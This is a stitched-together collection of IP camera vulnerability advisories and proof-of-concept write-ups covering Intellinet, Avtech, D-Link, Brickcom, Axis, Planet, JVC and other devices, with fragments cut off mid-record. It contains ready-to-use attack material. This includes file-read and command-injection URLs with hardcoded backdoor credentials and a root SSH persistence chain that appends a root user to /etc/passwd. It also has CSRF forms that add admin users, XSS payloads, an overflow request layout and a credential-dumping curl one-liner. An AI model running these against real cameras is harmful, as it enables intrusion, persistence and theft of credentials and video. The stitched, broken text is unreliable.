#EOF","0x00DESCRIPTION
During a recent engagement, a network camera was discovered. Web fuzzing
revealed a URL of
/device
containing output about running processes as well as a pretty complete
listing of webcontent which inevitably arose our suspicion.
More research revealed that files w/ known LFI and RCE issues were present,
leading to either arbitrary file reads or remote code execution, both w/
root privileges and using known default credentials (either admin:admin
or manufacture:erutcafunam).
After closer filesystem inspection, RCE led to a remote root SSH shell.
0x01IMPACT
The LFI vulnerability can be exploited using a URL of:
/cgi-bin/admin/fileread?READ.filePath=[filename]
and is able to read any file on the system.
The RCE vulnerability originates from a command injection and may be
exploited by calling a URL of:
/cgi-bin/mft/wireless_mft?ap=irrelevant;[command]
(as classy as it can get, we can also use the pipe ""|"" instead, and
linefeed a.k.a. ""%0a"" works as well)
effectively giving us remote code (or rather command) execution.
0x02 PROOF OF CONCEPT (PoC)
curl -iv ""http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1""
The script can be called like:
./LFI.sh /etc/passwd
to display the contents of the passwd file. When reading the configuration of
the BOA server (/etc/boa.conf), we find hardcoded credentials:
MFT manufacture erutcafunam
These can now be used to execute the RCE (based on command injection):
curl -iv ""http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless_mft?ap=testname;$1""
and can be called like:
./LFI.sh id
to display a user id of
uid=0(root) gid=0(root)
0x03SSH Remote Root Access
After having discovered the previously described vulnerabilities, multiple
attempts to spawn a nice reverse shell failed as the system was minimal
and did neither offer binaries like bash or netcat, nor any compilers or
scripting language interpreters to execute our code. Furthermore, binaries
that we transferred onto the system (for ARM little-endian architecture)
either resulted in ""Segmentation fault"" (mfsvenom) or as we saw later
""Illegal instruction"" (netcat for ARM).
We had to inspect the local attack surface and use the LOLBIN approach,
a.k.a. living off the land binaries available on the system.
In this case, the minimal and often busybox-included dropbear SSH daemon
became pretty handy.
To successfully implement a remote root SSH shell for persistance, several
steps had to be undertaken:
1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:
./RCE.sh ""/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key""
2) Then, add our user to the password file, e.g.:
./RCE.sh ""echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd""
3) Finally, start the server:
./RCE.sh ""/etc/dropbear/dropbear%20-E%20-F""
We can now SSH (using obsolete and insecure algorithms for both KeyExchange and HostKey)
into our rootshell:
sshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x

Selea ANPR camera within several functionalities. The application parses user supplied
data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image
request or check DNS for IP notification. Since no validation is carried out on the
parameters, an attacker can specify an external domain and force the application to
make an HTTP request to an arbitrary destination host. This can be used by an external
attacker for example to bypass firewalls and initiate a service and network enumeration
on the internal network through the affected application.

# Sony IPELA Network Camera (ftpclient.cgi) Remote Stack Buffer Overflow
# Vendor: Sony Electronics Inc.
# Product web page: https://pro.sony
# Affected version: SNC-DH120T v1.82.01
# Summary: IPELA is Sony's vision of the ultimate workplace, designed to revolutionize
# the way business communicates over global IP networks. IPELA products can improve the
# efficiency of your organization by connecting people and places with high-quality audio
# and video. The SNC-DH120T is an indoor tamper proof, high definition (720p) minidome
# network security camera with Electronic Day/Night settings, DEPA analysis and is ONVIF
# compliant. It supports dual streaming of H.264, MPEG-4 and JPEG at full frame-rate.
# Desc: The vulnerability is caused due to a boundary error in the processing of received
# FTP traffic through the FTP client functionality (ftpclient.cgi), which can be exploited
# to cause a stack-based buffer overflow when a user issues a POST request to connect to a
# malicious FTP server. Successful exploitation could allow execution of arbitrary code on
# the affected device or cause denial of service scenario.
# Tested on: gen5th/1.x

Title: Clever Dog Smart Camera
Vendor Homepage: http://www.cleverdog.com.cn/
Tested on Camera types: DOG-2W, DOG-2W-V4
Vulnerability: Hardware- Multiple Vulnerabilities
Date: 14/06/2019
Author: Alex Akinbi      Twitter: @alexakinbi
1. Unauthenticated file disclosure:
An attacker on the local network has unauthenticated access to the internal SD card via HTTP service on port 8000. The HTTP web server on the camera allows an attacker to download video archive recorded and saved on the external memory card attached.
For example: http://192.168.1.81:8000/20190606
2. Telnet Backdoor using default credentials:
An attacker on the network can login remotely to the camera and gain root access. The device ships with hard-coded credentials, accessible from a telnet login prompt using credentials username: "" root"" and password: ""12345678"". These credentials work on all devices.
3. Login password sent over network unencrypted using Clever Dog App:
Using a packet sniffer, an attacker on the same network can capture data packets and view
captured user login password MD5 hash. A weak password can be cracked and used to login to the user account.
4. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."

compression format is optimized for low-speed networks, thanks to which it
transmits a real-time image over the network with minimal delays. The camera
supports the switching of the broadcast modes, and in the event of a break in
communication with the remote file storage, it can continue recording to the

Input passed via the 'READ.filePath' parameter in fileread script is not properly
verified before being used to read files. This can be exploited to disclose
the contents of arbitrary files via absolute path or via the SendCGICMD API.

Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account. The vulnerability has been present in Hikvision products since at least 2014. In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names. Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing. In addition to gaining full administrative access, the vulnerability can be used to retrieve plain-text passwords for all configured users.

## Credit
## Vulnerability details
## Proof of Concept","The following advisory describes an arbitrary password change vulnerability found in Hanbanggaoke webcams.
Beijing Hanbang Technology, “one of the first enterprises entering into digital video surveillance industry, has been focusing on R&D of products and technology of digital video surveillance field. While providing product and technical support, it also provides overall solution for the industrial system; it has successfully provided system implementation and service supports for several industries.”
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
Vendor response
We tried to contact Hanbanggaoke since the 8th of August 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.
User controlled input is not sufficiently sanitized, by sending a PUT request to /ISAPI/Security/users/1 HTTP/1.1 an attacker can change the admin password.
CVE: CVE-2017-14335
In order to exploit the vulnerability, we need to use proxy tool (like Burp). We then connect to the victim’s machine and need to capture the data package.
We then edit the data of the following PUT request:
PUT /ISAPI/Security/users/1 HTTP/1.1
Host: x.x.x.x
Content-Length: 321
Cache-Control: max-age=0
Origin: http://x.x.x.x

## Vulnerabilities details","The following advisory describes three (3) vulnerabilities found in Ichano IP Cameras.
AtHome Camera is “a remote video surveillance app which turns your personal computer, smart TV/set-top box, smart phone, and tablet into a professional video monitoring system in a minute.”
The vulnerabilities found are:
Hard-coded username and password – telnet
Hard-coded username and password – Web server
Unauthenticated Remote Code Execution
An independent security researcher, Tim Carrington, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
We tried to contact Ichano since November 21st 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for these vulnerabilities.
CVE: CVE-2017-17761
Hard-coded username and password – telnet
The device runs a telnet server at startup with a default password of 123.
Hard-coded username and password – Web server
In /app/www/doc/script/login.js, in the function DoLogin(), client side validation is used to login a user:
if($(""#UserName"").val()==""super_yg""){jumpPage();return}
A user can login with these credentials and can then take control of the device over http:
Unauthenticated Remote Code Execution
The device runs “noodles” binary – a service on port 1300 that allows a remote (LAN) unauthenticated user to run arbitrary commands.
The binary has a set of commands he can run – if a user will use the following “protocol”, command to be run is enclosed like html tags, i.e. <system>id</system>, a successful execution results in <system_ack>ok</system_ack>."

[Details]
Vivotek using modified version of Boa/0.94.14rc21, and the vulnerability has been introduced by Vivotek.
The stack overflow is triggered by ""PUT"" or ""POST"" request:
[PUT|POST] /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n
However,
the absolutely minimal request to trigger the stack overflow is weird, most probably due to quick hack:
""[PUT|POST]Content-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n""
This allows us to insert [JUNK] with 'Good bytes' up to 9182 bytes (0x1FFF) of the request:
""[PUT|POST][JUNK]Content-Length[JUNK]:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n""
Notes:
1. B to I = $R4-$R11; X = $PC
2. Size of request availible in $R3 at the LDMFD
3. Max request size: 9182 bytes (0x1FFF)
4. ""Start with ""\n"" in ""\n\r\n\r\n"" needed to jump with 0x00xxxxxx (if not $PC will be 0x0dxxxxxx)
5. Space (0x20) after ':' in 'Content-Length:' counting as one char of the 20 bytes
6. Stack not protected with ""Stack canaries""
7. Good bytes: 0x01-0x09, 0x0b-0xff; Bad bytes: 0x00, 0x0a;
8. heap: Non-executable + Non-ASLR
9. stack: Non-executable + ASLR

Extreme Low LUX optics, 2 way audio, and full pan/tilt/zoom manipulation provide everything an SMB needs to safeguard their valuable resources.
D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability.
D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability (CVE-2017-7851)
D-Link DCS-936L devices with firmware 1.02.01 have CSRF. If a victim is logged into the camera's web console and visits a malicious site hosting a <Target_Device_IP.HTML> from another tab in the same browser, the malicious site can send requests to the victim's device. An attacker can add a new user, replace the firmware image with a malicious one, or connect the victim's device to a rogue Wireless Network.
An attacker can easily find out public IP address of victim's device on Shodan or similar search engines to create <Target_Device_IP.HTML> file. Victim must be logged into the camera's web console and visit attacker's site from another tab in the same browser.
D-Link DCS-936L prevents CSRF attack by looking at ‘Referer’ header. The ‘Referer’ IP should match with the one in ‘HOST’ header. If it does not, HTTP 403 is returned in the response. However, this device does not perform a strict check on ‘Referer’ header. It seems that it looks for the device’s IP address (which is the one in ‘HOST’ header) anywhere in the ‘Referer’ header. If found, it happily accepts the request.
An unauthenticated, remote attacker could host a malicious site that makes requests to the victim’s device without having credentials. In a targeted attack, an attacker needs to trick victim to visit a malicious site that exploits this vulnerability.
1. Attacker hosts a ‘<target_ip>.html’ on <attacking_ip>
<html>
<body>
<form id=""CSRF"" action=""http://<target_ip>/eng/admin/tools_admin.cgi"" method=""POST"">
<input type=""hidden"" name=""user"" value=""hacker"">
<input type=""hidden"" name=""action"" value=""set"">
<input type=""hidden"" name=""password"" value=""abc123"">
<input type=""hidden"" name=""confirmPassword"" value=""abc123"">
</form>
<script>
window.onload = function(){
document.forms['CSRF'].submit()
</script>
</body>
</html>
2. Victim logs into his device.
3. Victim then visits attackers site http://<attacking_ip>/<target_ip>.html
4. Above request adds a new user ‘Hacker’ which reboots the web server.
6. Browser sends add new user request to the target device <target_ip>. Victim's browser sets 'Referer' header to 'http://<attacking_ip>/<target_ip>.html'. As this contains the IP address of the device (<target_ip>), this request is processed successfully.
7. Server response shows user hacker added successfully:
8. Attacker can now log into the device as hacker/abc123

by adding 31bytes after the address of 'a'[dmin].

# FLIR Systems FLIR Thermal Camera PT-Series (PT-334 200562) Remote Root Exploit
# Vendor: FLIR Systems, Inc.
# Product web page: http://www.flir.com
# Affected version: Firmware version: 8.0.0.64
#                   Software version: 10.0.2.43
#                   Release: 1.3.4 GA, 1.3.3 GA and 1.3.2
# Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
# bring thermal and visible-light imaging together in a system that gives you
# video and control over both IP and analog networks. The PT-Series' precision
# pan/tilt mechanism gives you accurate pointing control while providing fully
# programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
# PT-Series cameras define a new standard of performance with five models that
# provide full 640x480 thermal resolution.
# Desc: FLIR Camera PT-Series suffers from multiple unauthenticated remote command
# injection vulnerabilities. The vulnerability exist due to several POST parameters
# in controllerFlirSystem.php script when calling the execFlirSystem() function not
# being sanitized when using the shell_exec() PHP function while updating the network
# settings on the affected device. This allows the attacker to execute arbitrary system
# commands as the root user and bypass access controls in place.

2. CREDIT
This vulnerability was identified during penetration test and Research by
Emiliano Ipar, Ignacio Lizaso and Gastón Rivadero.
3. Description
Brickom Cameras allow a low-privilege user to disclose every configuration
in the NVRAM, including credentials in clear text, remotely by making a
simple requests. This vulnerability, coupled with the fact that there are
two default users with known passwords which are rarely modified, allows an
attacker to disclose the admin password and latter every config.
The most Critical API call is users.cgi?action=getUsers, which provides
every user credential. Many other API calls to get information for the WIFI
password or FTP credentials, even the whole configuration, are affected
depending on the camera model.
On the hardware side, the UART console of some models (example: WCB-040Af,
with baudrate 38400) is exposed in the PCB and after soldering the
corresponding pins and connecting, the resulting shell has root access. A
simple NVSHOW command will list every config available in clear text,
including credentials.
4. Proof-of-Concept:
Using the following GET request:
curl http://<IP>:<PORT>/cgi-bin/users.cgi?action=getUsers -u user:pass -v
Request:
> GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1
> Authorization: Basic <BASE64 user:pass>
> User-Agent: curl/7.35.0
> Host: <IP>:<PORT>
> Accept: */*

#Proof-of-Concept:-
#Vulnerability Disclosure Timeline:","Small and unobtrusive, SecuriCamô IP surveillance solutions from D-Link allow you to monitor your offices or warehouses from anywhere - at anytime. Extreme Low LUX optics, 2 way audio, and full pan/tilt/zoom manipulation provide everything an SMB needs to safeguard their valuable resources.
D-Link DCS series network cameras implement a weak CrossDomain.XML.
Insecure CrossDomain.XML in D-Link DCS Series Cameras (CVE-2017-7852)
D-Link DCS cameras have a weak/insecure CrossDomain.XML file that allows sites hosting malicious Flash objects to access and/or change the device's settings via a CSRF attack. This is because of the 'allow-access-from domain' child element set to *, thus accepting requests from any domain. If a victim logged into the camera's web console visits a malicious site hosting a malicious Flash file from another Browser tab, the malicious Flash file then can send requests to the victim's DCS series Camera without knowing the credentials. An attacker can host a malicious Flash file that can retrieve Live Feeds or information from the victim's DCS series Camera, add new admin users, or make other changes to the device. Known affected devices are DCS-933L with firmware before 1.13.05, DCS-5030L, DCS-5020L, DCS-2530L, DCS-2630L, DCS-930L, DCS-932L, and DCS-932LB1.
Vendor Response:-
In 2016 we phased in CSRF mitigation on all CGI on the cameras so an injection like this would not be allowed authenticated or unauthenticated. Please refer to the tracking table below which includes the H/W Revision and firmware when this CSRF mitigation was enabled.

1. Build a Flash file 'FlashMe.swf' using Flex SDK which would access Advance.htm from target device and send the response to attackerís site.
2. Upload 'FlashMe.swf' to the webroot of attacking machine.
3. Log into the Cameraís web console.
4. From another tab in the same browser visit http://attackingsiteip.com/FlashMe.swf
5. Flash object from Request#4 sends a GET request to http://CameraIP/advanced.htm
6. Flash object receives response from Camera and forwards it to http://attackingsiteip.com/
7. Sensitive information like Live Feed, WiFi password etc can be retrieved or new admin users can be added.
22/02/2017: First email to disclose the vulnerability to the D-Link incident response team
17/03/2017: Vendor responded stating that this attack would not work due to recently added CSRF mitigation.Shipped two different models running latest firmware for testing.
26/03/2017: Confirmed the fix after testing latest firmware. The 'Referer' header based CSRF protection mitigates this attack which cannot be bypassed unless there is a browser vulnerability.

Multiple Vulnerabilities in Intellinet NFC-30IR Network Cameras
ADVISORY
Title: Local File Inclusion in CGI-SCRIPT & Hard-Coded Manufacturer Backdoor
Advisory ID: BITL-17-001
Date published: 2017-04-05
Date of last update: 2017-04-05
Vendors contacted: Intellinet
VULNERABILITY
Type: Local File Inclusion (LFI)(Authenticated) & Hardcoded Manufacturer Backdoor
Risk/Impact: Access to sensitive files & Access control bypass.
Exploitation Type : Remote
CVE Name: CVE-2017-7461 and CVE-2017-7462
DESCRIPTION
We found two vulnerabilities affecting the Intellinet NFC-30IR Camera with
firmware version LM.1.6.16.05
1. [CVE-2017-7461] once authenticated as admin:admin, you can read local files
by requesting the '/cgi-bin/admin/fileread?READ.filePath=<insert here>'
Instead of the developer using server-side scripts to render information, it takes the
plain text files and uses /fileread CGI script to simply return the plain text - the
site then relies on Javascript to ""format"" the text into something pretty.
There is no sanitization nor lock-down of what paths that script can read, hence all
files can be viewed. Interesting files to request are; /etc/passwd; /etc/boa.conf and more.
2. [CVE-2017-7462] a manufacturer backdoor exists that allows one to access a script
called '/cgi-bin/mft/manufacture' by authenticating as manufacture:erutcafunam
This binary has been analyzed before by other vendors. We did not analyze it again as we
feel this is the same file used in other cameras. Note that the NFC-30IR does NOT have the
wireless_mft executable.
The hard-coded manufacturer user:pass is manufacture:erutcafunam as shown in the
below boa.conf snippet;
--snip--
ScriptAlias /cgi-bin/operator/ /opt/cgi/operator/
ScriptAlias /cgi-bin/view/ /opt/cgi/view/
ScriptAlias /cgi-bin/admin/ /opt/cgi/admin/
ScriptAlias /cgi-bin/jpg/ /opt/cgi/jpg/
ScriptAlias /cgi-bin/ /opt/cgi/
ScriptAlias /jpg /opt/cgi/jpg
MFT manufacture erutcafunam
--snip--
This indicates that the camera hardware may be some kind of modified/stripped version
of a Zavio board.
VENDOR RESPONSE/NOTIFICATION
Vendor was given 7 days to respond, and 3 written notifications.
No response received nor acknowledgement.
Vendor has not released updates to fix the vulnerabilities.

Avtech is the second most popular search term in Shodan. According to
Shodan, more than 130.000 Avtech devices are exposed to the internet.
Vulnerabilities
1) Plaintext storage of administrative password
Every user password is stored in clear text. An attacker with access to
the device itself can easily obtain the full list of passwords. By
exploiting command injection or authentication bypass issues, the clear
text admin password can be retrieved.
2) Missing CSRF protection
The web interface does not use any CSRF protection. If a valid session
exists for the user, the attacker can modify all settings of the device
via CSRF. If there is no valid session, but the user did not change the
default admin password, the attacker can log in as admin via CSRF as well.
3) Unauthenticated information disclosure
Under the /cgi-bin/nobody folder every CGI script can be accessed
without authentication.

PushNotify.MaxChannel=8
4) Unauthenticated SSRF in DVR devices
In case of DVR devices, Search.cgi can be accessed without
authentication. This service is responsible for searching and accessing
IP cameras in the local network. In newer firmware versions, Search.cgi
provides the cgi_query action, which performs an HTTP request with the
specified parameters. By modifying the ip, port and queryb64str
parameters, an attacker is able to perform arbitrary HTTP requests
through the DVR device without authentication.
POC:
5) Unauthenticated command injection in DVR devices
The cgi_query action in Search.cgi performs HTML requests with the wget
system command, which uses the received parameters without sanitization
or verification. By exploiting this issue, an attacker can execute any
system command with root privileges without authentication.
POC:
6) Authentication bypass #1
Video player plugins are stored as .cab files in the web root, which can
be accessed and downloaded without authentication. The cab file request
verification in the streamd web server is performed with the strstr
function, which means that a request should not be authenticated if it
contains the ô.cabö string anywhere in the URL. We note that some of the
models contain an additional check in the CgiDaemon, which allows
unauthenticated cgi access only under the /cgi-bin/nobody folder.
POC:
7) Authentication bypass #2
Cgi scripts in the /cgi-bin/nobody folder can be accessed without
authentication (e.g. for login). The streamd web server verifies whether
the request can be performed without authentication by searching for the
ô/nobodyö string in the URL with  the strstr function. Thus, if a
request contains the ""/nobody"" string anywhere in the URL, it does not
have to be authenticated. We note that some of the models contain an
additional check in the CgiDaemon, which allows unauthenticated cgi
access only under the /cgi-bin/nobody folder.
POC:
8) Unauthenticated file download from web root
If a cab file is requested, the web server sends the file without
processing it. Because the streamd web server verifies the cab file
request by searching for the ô.cabö string in the URL with the strstr
function, any file (even the cgi scripts) in the web root can be
downloaded without authentication.
POC: http://<device_ip>/cgi-bin/cgibox?.cab
9) Login captcha bypass #1
To prevent brute-forcing attempts, Avtech devices require a captcha for
login requests. However, if the login requests contain the login=quick
parameter, the captcha verification is bypassed.
POC:
10) Login captcha bypass #2
Instead of using a random session ID, Avtech devices use the
base64-encoded username and password as the Cookie value. Since the IP
address of the logged in user is not stored, if an attacker sets the
Cookie manually, the captcha verification can by bypassed easily.
11) Authenticated command injection in CloudSetup.cgi
Devices that support the Avtech cloud contain CloudSetup.cgi, which can
be accessed after authentication. The exefile parameter of a
CloudSetup.cgi request specifies the system command to be executed.
Since there is no verification or white list-based checking of the
exefile parameter, an attacker can execute arbitrary system commands
with root privileges.
POC: http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps
12) Authenticated command injection in adcommand.cgi
Some of the Avtech devices contain adcommand.cgi to perform ActionD
commands. The adcommand.cgi can be accessed after authentication. In
newer devices the ActionD daemon provides the DoShellCmd function, which
performs a system call with the specified parameters. Since there is no
verification or white list-based checking of the parameter of the
DoShellCmd function, an attacker can execute arbitrary system commands
with root privileges.
POC:
POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1
Host: <device_ip>
Content-Length: 23
Cookie: SSID=YWRtaW46YWRtaW4=
DoShellCmd ""strCmd=ps&""
13) Authenticated command injection in PwdGrp.cgi
The PwdGrp.cgi uses the username, password and group parameters in a new
user creation or modification request in a system command without
validation or sanitization. Thus and attacker can execute arbitrary
system commands with root privileges.
We are aware that this vulnerability is being exploited in the wild!
POC:
14) HTTPS used without certificate verification
The SyncCloudAccount.sh, QueryFromClient.sh and SyncPermit.sh scripts
use wget to access HTTPS sites, such as https://payment.eagleeyes.tw, by
specifying the no-check-certificate parameter. Thus wget skips server
certificate verification and a MITM attack is possible against the HTTPS
communication.
Timeline
2015.10.19: First attempt to contact with Avtech, but we did not receive
any response
2016.05.24: Second attempt to contact Avtech without any response
2016.05.27: Third attempt to contact Avtech by sending e-mail to public
Avtech e-mail addresses. We did not receive any response.
2016.xx.xx: Full disclosure
POC
POC script is available to demonstrate the following problems [3]:
- Unauthenticated information leakage (capabilities)
- Authentication bypass (.cab, nobody)
- Unauthenticated SSRF on DVR devices
- Unauthenticated command injection on DVR devices
- Login captcha bypass with login=quick or manual cookie creation
- CloudSetup.cgi command injection after authentication
- adcommand.cgi command injection after authentication
A video demonstration is also available [1], which presents some of the
above problems.
Recommendations
Unfortunately there is no solution available for these vulnerabilities
at the moment. You can take the following steps to protect your device:
- Change the default admin password
- Never expose the web interface of any Avtech device to the internet
We note that the above vulnerabilities were found within a short period
of time without a systematic approach. Based on the vulnerability types
we found and the overall code quality, the devices should contain much
more problems.

(+) Title: JVC Multiple Products Multiple Vulnerabilities
(+) Vendor: JVC Professional Video
(+) Research and Advisory: Orwelllabs
(+) Adivisory URL:
(+) OLSA-ID: OLSA-2016-04-01
(+) Affected Products: JVC HDR VR-809/816, Network cameras VN-C*, VN-V*,
VN-X* with firmwares 1.03 and 2.03
(+) IoT Attack Surface: Device Administrative Interface
(+) Owasp IoTTop10: I1, I2
* Overview
I1 - 1. Multiple Cross-site Scripting
I1 - 2. HTTP Header Injection
I1 - 3. Multiple Cross-site Request Forgery
I1 - 4. Cleartext sensitive data
I1 - 5. Weak Default Credentials/Known credentials
I2 - 6. Poorly Protected Credentials
1. Reflected Cross-site scripting
JVC Hard Disk Recorders are prone to XSS and HTTP Header Injection[2].
(+) Affected Products:
JVC VR-809 HDR
JVC VR-816 HDR
(+) Technical Details/PoCs
(+) URL Trigger:
(+) Payload used [ *** XSS *** ]: <img src=a onerror=alert(""0rwelll4bs"")>

* In fact the javascript can be triggered just requesting the '/api/param?'
directly with payload, like this:
(+) URL: http://xxx.xxx.xxx.xxx/api/param?[*** XSS *** ]
2. HTTP Header Injection
The value of the ""video.input(X).comment/status"" request parameter is
copied into the 'X-Response' response header.
So the malicious payload submitted in the parameter generates a response
with an injected HTTP header.

4. Cleartext sensitive data
By default everything is trasmite over HTTP, including credentials.
5. Weak Default Credentials/Known credentials
The vast maiority of these devices remain with default credential admin:jvc
or admin:[model-of-camera] and costumers are not obligated to change it
during initial setup.
6. Poorly Protected Credentials
An attacker in the same network is able to capture and decode the
credentials as they aren't trasmited over HTTPs and are protected using
just
Base64 with Basic Authorization.

Background
Brickcom (calls itself) as a ""leading network video manufacturer in the IP
surveillance industry.
Dedicated to providing the best IP surveillance solutions with a solid
foundation for engineering
quality network video equipment with a Research and Development Department
that has been producing
wireless broadband networking equipment for over twenty years.""
These products are used as video surveillance system by costumers and
important sectors such as the Thai 4ir F0rce, as can be seen on the
Vendor's web site.
* notes:
- some firmwares affected (item 'affected products' are very recent, having
been launched
a few months ago, and still vulnerable ... so this is an structural/legacy
problem.
- sensitive information presented in this advisory are fake.

Proof of Concept
Online Bash exploit-p0c:
curl -s -O http://xxx.xxx.xxx.xxx/configfile.dump && grep ""users0""
configfile.dump|awk '{ FS="".""; } { print $4; }' || echo -e ""[-] The target
seems not be vulnerable, Mr. Robot! \n""
IF target (xxx.xxx.xxx.xxx) is vulnerable the exploit will show a username,
password and privilege level (1:admin), like this:
password=4adm1niS3cr3tP4ss
privilege=1
username=BrickcomADMIN
and a configfile.dump with all credentials, settings, etc. will be recorded
locally.
IF not vulnerable, you'll see the message:
""[-] The target seems not bet vulnerable, Mr. Robot!""
II. sensitive information in plaintext
As shown, there are countless cases where credentials and other sensitive
information are store in plaintext.
III. Hard-coded Credentials
All credentials and other sensitive information can be found in html page
user_management_config.html,
Just viewing the html source code:
view-source:http://{xxx.xxx.xxx.xxx}/user_management_config.html
<script type=""text/javascript"">
var Edit_id="""";
var userSet_size=""5""
var User_index=new Array(10);

I. ADVISORY INFORMATION
Title: Axis Network Cameras Multiple Cross-site scripting
Vendor: Axis Communications
Class: Improper Input Validation [CWE-20]
CVE Name: CVE-2015-8256
Remotely Exploitable: Yes
Locally Exploitable: No
OLSA-ID: OLSA-2015-8256
Adivisory URL:
II. Background
Axis is the market leader in network video, invented the world’s first
network camera back in 1996 and we’ve been innovators in video surveillance
ever since. Axis network video products are installed in public places and
areas such as retail chains, airports, trains, motorways, universities,
prisons, casinos and banks.
III. vulnerability
AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
scripting vulnerability.
IV. technical details
These attack vectors allow you to execute an arbitrary javascript code in
the user browser (session) with this steps:
type=""text/javascript>prompt(""AXIS_PASSWORD:"")</script>
This will create a entry in the genneral log file (/var/log/messages) So,
when the user is viewing the log 'system options' -> 'support' -> 'Logs &
Reports':
will be displayed a prompt for the password of the current user
('AXIS_PASSWORD').
However, due to CSRF presented is even possible to perform all actions
already presented: create, edit and remove users and applications, etc. For
example, to delete an application ""axis_update"" via SXSS:
axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml""></script>
* A reflected cross-site scripting affects all models of AXIS devices on
the same parameter:
{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert('AXIS-XSS')</script><!--
{axishost}/admin/config.shtml?group=%3Cscript%3Ealert%281%29%3C/script%3E

Issues
I.   Local File Inclusion (42 vectors)
II.  Arbitrary file read/Authentication bypass
III. Sensitive information disclosure
IV.  Cross-site request forgery
V.   Reflected Cross-site scripting
VI.  hardcoded credentials
I. Local File Inclusion

others is prone to Local File Include (LFI).
PoC
The request bellow is generated when a new user is added, in this case
we are adding the following administrative credential for the cam:
""root:r00tx"".
GET /cgi-bin/admin/querylogin.cgi HTTP/1.1
Host: {xxx.xxx.xxx.xxx}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101
Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://

Authorization: Basic YdRRtXW41YXRtad4=
Connection: keep-alive
If-Modified-Since: Mon, 08 Jul 2013 11:10:26 GMT
If the value of the parameter ""redirect"" was changed to any system file
will return the contents of that file, as shown below:
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=/etc/passwd
In this case will retrieved the content of /etc/passwd
Vectors:
There are a total of 42 vectors of LFI, the detailed results will be
published in www.orwelllabs.com [1] soon.
Basically all menus of the camera (shown below) to submit, add, modify and
remove settings trigger the corresponding
scripts to access resource that contains a parameter ""redirect"" which is
also affected.

II. Arbitrary file read/Authentication bypass
The camera offers a feature to perform the download settings via a backup
file. However,
(how acess control is not effective) this file remains accessible via the
browser for an unauthenticated user.
PoC
wget --no-check-certificate https://{xxx.xxx.xxx.xxx}/backup.tar.gz
tar -xzvf backup.tar.gz
cat tmp/sysConfig/sysenv.cfg|strings|fmt|cut -f8,9 -d"" ""
It will return the credential to access the camera
Through this vulnerability a user can also obtain the credential of the AP
to which the camera is connected just parsing
the file: 'tmp/sysConfig/extra.info'
III. Sensitive information disclosure
Using LFI vulnerability report, a user can obtain sensitive information
such as username and password by reading the log file, as follows:
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=&pwd=&grp=&sgrp=&action=&redirect=/var/log/messages
IV. Cross-site request forgery
Planet IP cams ICA-* are prone to Multple CSRF.
PoC
- This will create a admin credential: root:r00tx

<!-- CSRF PoC - -->

V. Cross-Site Scripting
Cams models ICA-* are prone to Multiple XSS
POC
this will pop-up the message XSS in the browser
VI. hardcoded credentials
The credentials of web management can be found just viewing the source of
page default_nets.htm:
POC
code:
function av_onload(){
CheckMobileMode();
util_SetUserInfo();
Loadplay();

function Loadplay(){
play(""MasterUsr"",""MasterPwd"",""554"",parseInt(""99""),parseInt(""99""),""1"",parseInt(""2""),parseInt(""0""),""192.168.1.99"","""");

EDB-ID: 38245
Advisory ID: OLSA-2015-0919
Advisory URL: http://www.orwelllabs.com/2015/10/adh-web-server-ip-cameras-improper.html
Date published: 2015-09-19
Date of last update: 2016-02-15
Vendors contacted: Dedicated Micros
2. Vulnerability Information
Class: Information Exposure [CWE-200]
Impact: Access Control Bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: N/A
3. Vulnerability Description
Due to improper access restriction the ADH-Web device [1] allows a remote attacker to browse and access arbitrary files from the following directorie '/hdd0/logs'. You can also get numerous information (important for a fingerprint step) via the parameter variable in variable.cgi script [2].
Background:
